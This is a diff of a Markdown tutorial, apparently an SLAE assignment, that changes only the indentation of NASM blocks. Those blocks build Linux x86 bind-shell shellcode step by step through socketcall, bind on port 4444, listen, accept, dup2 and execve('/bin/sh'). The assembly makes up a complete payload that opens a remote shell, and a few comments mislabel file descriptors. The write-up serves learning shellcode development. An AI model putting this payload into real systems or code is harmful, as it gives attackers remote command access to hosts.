@@ -124,11 +124,11 @@ In Linux x86 assembly, system calls are made through the software interrupt `int
 
 #### Clear Registers
 ```nasm
-    ; clear registers
-    xor eax, eax
-    xor ebx, ebx
-    xor ecx, ecx
-    xor edx, edx
+; clear registers
+xor eax, eax
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
 ```
 
 #### Socketcall Explained
@@ -161,18 +161,18 @@ root@kali:~/workspace/SLAE# grep socketcall /usr/include/x86_64-linux-gnu/asm/un
 The first C function from the analyzed code above that will be converted to assembly is the call to `socket`. The assembly code that follows is meant to replicate the `int sockfd = socket(AF_INET, SOCK_STREAM, 0);` line of C code.
 
 ```nasm
-    ; // Create a TCP Socket
-    ; int socket(int domain, int type, int protocol);
-    ; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    push edx            ; 0
-    push 0x1            ; SOCK_STREAM = 1
-    push 0x2            ; AF_INET = 2
-    ; int socketcall(int call, unsigned long *args);
-    mov al, 0x66        ; socketcall
-    inc bl              ; socketcall call sys_socket = 1
-    mov ecx, esp        ; socketcall *args
-    int 0x80            ; returns int sockfd in eax
-    mov esi, eax        ; store int sockfd in esi
+; // Create a TCP Socket
+; int socket(int domain, int type, int protocol);
+; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+push edx            ; 0
+push 0x1            ; SOCK_STREAM = 1
+push 0x2            ; AF_INET = 2
+; int socketcall(int call, unsigned long *args);
+mov al, 0x66        ; socketcall
+inc bl              ; socketcall call sys_socket = 1
+mov ecx, esp        ; socketcall *args
+int 0x80            ; returns int sockfd in eax
+mov esi, eax        ; store int sockfd in esi
 ```
 
 #### IP Socket Address Structure
@@ -180,63 +180,63 @@ The first C function from the analyzed code above that will be converted to asse
 Create `struct sockaddr_in addr;`
 
 ```nasm
-    ; // Create an IP Socket Address Structure
-    ; struct sockaddr_in addr;
-    push edx            ; padding
-    push edx            ; addr.sin_addr.s_addr = INADDR_ANY = 0;
-    push word 0x5c11    ; addr.sin_port = htons(4444);
-    push word 0x2       ; addr.sin_family = AF_INET = 2;
+; // Create an IP Socket Address Structure
+; struct sockaddr_in addr;
+push edx            ; padding
+push edx            ; addr.sin_addr.s_addr = INADDR_ANY = 0;
+push word 0x5c11    ; addr.sin_port = htons(4444);
+push word 0x2       ; addr.sin_family = AF_INET = 2;
 ```
 
 #### Bind Replication using Socketcall
 Call to `bind`
 
 ```nasm
-    ; // Bind TCP Socket to IP Socket Address Structure
-    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-    ; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
-    mov ecx, esp        ; pointer to struct sockaddr_in addr;
-    push 0x10           ; sizeof(addr) = 16
-    push ecx            ; (struct sockaddr *)&addr
-    push esi            ; int sockfd
-    ; int socketcall(int call, unsigned long *args);
-    mov al, 0x66        ; socketcall
-    inc bl              ; socketcall call sys_bind = 2
-    mov ecx, esp        ; socketcall *args
-    int 0x80            ; returns 0 in eax
+; // Bind TCP Socket to IP Socket Address Structure
+; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+mov ecx, esp        ; pointer to struct sockaddr_in addr;
+push 0x10           ; sizeof(addr) = 16
+push ecx            ; (struct sockaddr *)&addr
+push esi            ; int sockfd
+; int socketcall(int call, unsigned long *args);
+mov al, 0x66        ; socketcall
+inc bl              ; socketcall call sys_bind = 2
+mov ecx, esp        ; socketcall *args
+int 0x80            ; returns 0 in eax
 ```
 
 #### Listen Replication using Socketcall
 Call to `listen`
 
 ```nasm
-    ; // Designate Socket to Listen for Connection Requests
-    ; int listen(int sockfd, int backlog);
-    ; listen(sockfd, 0);
-    push edx            ; 0
-    push esi            ; int sockfd
-    ; int socketcall(int call, unsigned long *args);
-    mov al, 0x66        ; socketcall
-    mov bl, 0x4         ; socketcall call sys_listen = 4
-    mov ecx, esp        ; socketcall *args
-    int 0x80            ; returns 0 in eax
+; // Designate Socket to Listen for Connection Requests
+; int listen(int sockfd, int backlog);
+; listen(sockfd, 0);
+push edx            ; 0
+push esi            ; int sockfd
+; int socketcall(int call, unsigned long *args);
+mov al, 0x66        ; socketcall
+mov bl, 0x4         ; socketcall call sys_listen = 4
+mov ecx, esp        ; socketcall *args
+int 0x80            ; returns 0 in eax
 ```
 
 #### Accept Replication using Socketcall
 Call to `accept`
 
 ```nasm
-    ; // Accept Connection Requests on the Socket
-    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-    ; int connfd = accept(sockfd, NULL, NULL);
-    push edx            ; NULL
-    push edx            ; NULL
-    push esi            ; sockfd
-    ; int socketcall(int call, unsigned long *args);
-    mov al, 0x66        ; socketcall
-    inc bl              ; socketcall call sys_accept = 5
-    mov ecx, esp        ; socketcall *args
-    int 0x80            ; returns int connfd in eax
+; // Accept Connection Requests on the Socket
+; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+; int connfd = accept(sockfd, NULL, NULL);
+push edx            ; NULL
+push edx            ; NULL
+push esi            ; sockfd
+; int socketcall(int call, unsigned long *args);
+mov al, 0x66        ; socketcall
+inc bl              ; socketcall call sys_accept = 5
+mov ecx, esp        ; socketcall *args
+int 0x80            ; returns int connfd in eax
 ```
 
 #### Dup2 Replication
@@ -247,21 +247,21 @@ Next, a system call to to `dup2` is required which is assigned the system call n
 ```
 
 ```nasm
-    ; // Direct Connection Socket Output
-    ; int dup2(int oldfd, int newfd);
-    mov ebx, eax        ; store int connfd in ebx
-    ; dup2(connfd, 0);
-    mov al, 0x3f        ; dup2
-    mov ecx, edx        ; 0 = STDOUT
-    int 0x80
-    ; dup2(connfd, 1);
-    mov al, 0x3f        ; dup2
-    inc cl              ; 1 = STDIN
-    int 0x80
-    ; dup2(connfd, 2);
-    mov al, 0x3f        ; dup2
-    inc cl              ; 2 = STDERROR
-    int 0x80
+; // Direct Connection Socket Output
+; int dup2(int oldfd, int newfd);
+mov ebx, eax        ; store int connfd in ebx
+; dup2(connfd, 0);
+mov al, 0x3f        ; dup2
+mov ecx, edx        ; 0 = STDOUT
+int 0x80
+; dup2(connfd, 1);
+mov al, 0x3f        ; dup2
+inc cl              ; 1 = STDIN
+int 0x80
+; dup2(connfd, 2);
+mov al, 0x3f        ; dup2
+inc cl              ; 2 = STDERROR
+int 0x80
 ```
 
 #### Execve Replication
@@ -272,19 +272,19 @@ Finally, a system call to `execve` needs to be made in order to execute `/bin/sh
 ```
 
 ```nasm
-    ; // Execute Program
-    ; int execve(const char *pathname, char *const argv[], char *const envp[]);
-    ; execve("/bin/sh", NULL, NULL);
-    push edx            ; delimiting NULL for pathname
-    push 0x68732f2f     ; //sh
-    push 0x6e69622f     ; /bin
-    mov ebx, esp        ; pointer to pathname
-    push edx            ; delimiting NULL for argv[] & envp[]
-    mov edx, esp        ; *const envp[]
-    push ebx            ; *pathname
-    mov ecx, esp        ; *const argv[]
-    mov al, 0xb         ; execve
-    int 0x80
+; // Execute Program
+; int execve(const char *pathname, char *const argv[], char *const envp[]);
+; execve("/bin/sh", NULL, NULL);
+push edx            ; delimiting NULL for pathname
+push 0x68732f2f     ; //sh
+push 0x6e69622f     ; /bin
+mov ebx, esp        ; pointer to pathname
+push edx            ; delimiting NULL for argv[] & envp[]
+mov edx, esp        ; *const envp[]
+push ebx            ; *pathname
+mov ecx, esp        ; *const argv[]
+mov al, 0xb         ; execve
+int 0x80
 ```
 
 ## Wrapper Program for Port Configuration
